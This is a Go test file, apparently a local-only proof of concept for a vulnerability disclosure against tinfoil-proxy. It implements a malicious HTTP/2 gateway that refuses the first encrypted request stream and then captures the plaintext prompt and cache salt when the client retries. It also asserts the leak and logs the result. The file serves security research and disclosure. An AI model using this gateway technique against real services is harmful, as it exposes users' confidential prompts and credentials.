package main

// verify3 end-to-end PoC (LOCAL ONLY) against tinfoil-proxy as shipped, at its
// pinned versions (tinfoil-go v0.16.1 via a local copy that only adds a test
// hook, encrypted-http-body-protocol v0.3.2). The only replaced step is the
// replica attestation fetch+verify inside the gateway's seal.build closure.
// http.DefaultTransport is untouched; the malicious gateway's certificate is
// trusted via SSL_CERT_FILE (stand-in for a WebPKI certificate).

import (
	"bytes"
	"crypto/tls"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	ehbpidentity "github.com/tinfoilsh/encrypted-http-body-protocol/identity"
	tinfoil "github.com/tinfoilsh/tinfoil-go"
	"github.com/tinfoilsh/tinfoil-go/verifier/client"
	"github.com/tinfoilsh/tinfoil-go/verifier/document"
	"golang.org/x/net/http2"
	"golang.org/x/net/http2/hpack"
)

type pStream struct {
	conn int
	id   uint32
	hdr  map[string]string
	body bytes.Buffer
}

type pGateway struct {
	t        *testing.T
	upstream string
	mu       sync.Mutex
	conns    int
	alpn     []string
	streams  []*pStream
	original *pStream
}

func (m *pGateway) serve(raw net.Conn) {
	defer raw.Close()
	tc := raw.(*tls.Conn)
	if err := tc.Handshake(); err != nil {
		return
	}
	m.mu.Lock()
	m.conns++
	connNo := m.conns
	m.alpn = append(m.alpn, tc.ConnectionState().NegotiatedProtocol)
	m.mu.Unlock()
	if tc.ConnectionState().NegotiatedProtocol != "h2" {
		return
	}
	preface := make([]byte, len(http2.ClientPreface))
	if _, err := io.ReadFull(tc, preface); err != nil || string(preface) != http2.ClientPreface {
		return
	}
	fr := http2.NewFramer(tc, tc)
	fr.ReadMetaHeaders = hpack.NewDecoder(65536, nil)
	var hb bytes.Buffer
	he := hpack.NewEncoder(&hb)
	fr.WriteSettings()
	open := map[uint32]*pStream{}
	for {
		f, err := fr.ReadFrame()
		if err != nil {
			return
		}
		var done *pStream
		switch f := f.(type) {
		case *http2.SettingsFrame:
			if !f.IsAck() {
				fr.WriteSettingsAck()
			}
		case *http2.PingFrame:
			if !f.IsAck() {
				fr.WritePing(true, f.Data)
			}
		case *http2.MetaHeadersFrame:
			s := &pStream{conn: connNo, id: f.StreamID, hdr: map[string]string{}}
			for _, hf := range f.Fields {
				s.hdr[hf.Name] = hf.Value
			}
			open[f.StreamID] = s
			if f.StreamEnded() {
				done = s
			}
		case *http2.DataFrame:
			s := open[f.StreamID]
			if s == nil {
				continue
			}
			s.body.Write(f.Data())
			if n := uint32(len(f.Data())); n > 0 {
				fr.WriteWindowUpdate(0, n)
				fr.WriteWindowUpdate(f.StreamID, n)
			}
			if f.StreamEnded() {
				done = s
			}
		}
		if done == nil {
			continue
		}
		delete(open, done.id)
		m.mu.Lock()
		m.streams = append(m.streams, done)
		attack := m.original == nil && done.body.Len() > 0
		if attack {
			m.original = done
		}
		fwd := m.original
		m.mu.Unlock()
		if attack {
			fr.WriteRSTStream(done.id, http2.ErrCodeRefusedStream)
			continue
		}
		up, _ := http.NewRequest(done.hdr[":method"], m.upstream+done.hdr[":path"], bytes.NewReader(fwd.body.Bytes()))
		for _, h := range []string{"content-type", "authorization", "ehbp-encapsulated-key"} {
			if v, ok := fwd.hdr[h]; ok {
				up.Header.Set(h, v)
			}
		}
		upResp, err := (&http.Client{Transport: &http.Transport{}}).Do(up)
		if err != nil {
			m.t.Errorf("upstream: %v", err)
			return
		}
		upBody, _ := io.ReadAll(upResp.Body)
		upResp.Body.Close()
		hb.Reset()
		he.WriteField(hpack.HeaderField{Name: ":status", Value: strconv.Itoa(upResp.StatusCode)})
		if ct := upResp.Header.Get("Content-Type"); ct != "" {
			he.WriteField(hpack.HeaderField{Name: "content-type", Value: ct})
		}
		if n := upResp.Header.Get("Ehbp-Response-Nonce"); n != "" {
			he.WriteField(hpack.HeaderField{Name: "ehbp-response-nonce", Value: n})
		}
		fr.WriteHeaders(http2.HeadersFrameParam{StreamID: done.id, BlockFragment: hb.Bytes(), EndHeaders: true, EndStream: len(upBody) == 0})
		for len(upBody) > 0 {
			n := min(len(upBody), 16384)
			fr.WriteData(done.id, n == len(upBody), upBody[:n])
			upBody = upBody[n:]
		}
	}
}

func TestPoCVerify3_TinfoilProxyLeaksPromptToGateway(t *testing.T) {
	certFile, keyFile := os.Getenv("POC_LEAF_CERT"), os.Getenv("POC_LEAF_KEY")
	if certFile == "" || os.Getenv("SSL_CERT_FILE") == "" {
		t.Skip("needs SSL_CERT_FILE, POC_LEAF_CERT, POC_LEAF_KEY")
	}
	// Genuine replica enclave (EHBP v0.3.2 server middleware).
	id, err := ehbpidentity.NewIdentity()
	if err != nil {
		t.Fatal(err)
	}
	var mu sync.Mutex
	var enclaveSaw []string
	enclaveSrv := httptest.NewServer(id.Middleware()(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		b, _ := io.ReadAll(r.Body)
		mu.Lock()
		enclaveSaw = append(enclaveSaw, string(b))
		mu.Unlock()
		w.Header().Set("Content-Type", "application/json")
		w.Write([]byte(`{"id":"c1","object":"chat.completion","created":1,"model":"m","choices":[{"index":0,"finish_reason":"stop","message":{"role":"assistant","content":"reply-from-genuine-replica"}}]}`))
	})))
	defer enclaveSrv.Close()

	// Malicious gateway (TLS-terminating, h2).
	cert, err := tls.LoadX509KeyPair(certFile, keyFile)
	if err != nil {
		t.Fatal(err)
	}
	ln, err := tls.Listen("tcp", "127.0.0.1:0", &tls.Config{Certificates: []tls.Certificate{cert}, NextProtos: []string{"h2", "http/1.1"}})
	if err != nil {
		t.Fatal(err)
	}
	defer ln.Close()
	gw := &pGateway{t: t, upstream: enclaveSrv.URL}
	go func() {
		for {
			c, err := ln.Accept()
			if err != nil {
				return
			}
			go gw.serve(c)
		}
	}()
	gatewayURL := "https://" + ln.Addr().String()

	// Same construction as runProxy().
	opts, err := gatewayOptions(nil, false, "victim-user-cache-secret-91c2")
	if err != nil {
		t.Fatal(err)
	}
	var catalog atomic.Pointer[tinfoil.Catalog]
	catalog.Store(&tinfoil.Catalog{"m": {Repo: "tinfoilsh/confidential-model-x", Hosts: []string{"replica.example"}}})
	gateway, err := tinfoil.NewGateway(gatewayURL, func() tinfoil.Catalog { return *catalog.Load() }, opts)
	if err != nil {
		t.Fatal(err)
	}
	tinfoil.PoCReplaceGatewayAttestation(gateway, gatewayURL, func(host string) func() (*client.VerifiedDocumentV3, error) {
		return func() (*client.VerifiedDocumentV3, error) {
			return &client.VerifiedDocumentV3{
				EnclaveHost: host,
				CryptoMaterial: []document.CryptoMaterialItem{{
					ID: document.CryptoMaterialIDHPKE, Format: document.KeyX25519HPKEV1Format, Data: id.MarshalPublicKeyHex(),
				}},
				FreshnessExpiresAt: time.Now().Add(time.Hour),
			}, nil
		}
	})
	base, _ := url.Parse(gatewayURL)
	proxy := newReverseProxy(gateway.HTTPClient().Transport, base.Host, nil, nil)
	mux := http.NewServeMux()
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		r.Body = http.MaxBytesReader(w, r.Body, maxRequestBodySize)
		proxy.ServeHTTP(w, r)
	})
	local := httptest.NewServer(mux)
	defer local.Close()

	// Any OpenAI-compatible tool pointed at the local proxy.
	req, _ := http.NewRequest(http.MethodPost, local.URL+"/v1/chat/completions",
		strings.NewReader(`{"model":"m","messages":[{"role":"user","content":"CONFIDENTIAL-PROMPT via tinfoil-proxy: patient Jane Roe"}]}`))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Authorization", "Bearer tk_victim_api_key")
	resp, err := (&http.Client{Transport: &http.Transport{}}).Do(req)
	if err != nil {
		t.Fatal(err)
	}
	body, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	t.Logf("local client got %s body=%s", resp.Status, body)

	gw.mu.Lock()
	defer gw.mu.Unlock()
	t.Logf("gateway TLS conns=%d ALPN=%v", gw.conns, gw.alpn)
	leaked := false
	for i, s := range gw.streams {
		b := s.body.String()
		show := b
		if len(show) > 200 {
			show = show[:200] + "..."
		}
		t.Logf("gateway stream#%d conn=%d id=%d %s %s x-tinfoil-seal=%s ehbp-key-present=%v body(%dB)=%q",
			i, s.conn, s.id, s.hdr[":method"], s.hdr[":path"], s.hdr["x-tinfoil-seal"], s.hdr["ehbp-encapsulated-key"] != "", s.body.Len(), show)
		if strings.Contains(b, "patient Jane Roe") {
			leaked = true
		}
	}
	mu.Lock()
	t.Logf("genuine replica handled %d request(s): %q", len(enclaveSaw), enclaveSaw)
	mu.Unlock()
	if resp.StatusCode != http.StatusOK || !strings.Contains(string(body), "reply-from-genuine-replica") {
		t.Fatalf("expected the proxied call to succeed normally")
	}
	if !leaked {
		t.Fatal("gateway did not see plaintext")
	}
	t.Logf("RESULT: tinfoil-proxy (tinfoil-go v0.16.1 + EHBP v0.3.2) disclosed the plaintext prompt and cache_salt to the gateway; the local client saw a normal 200")
}
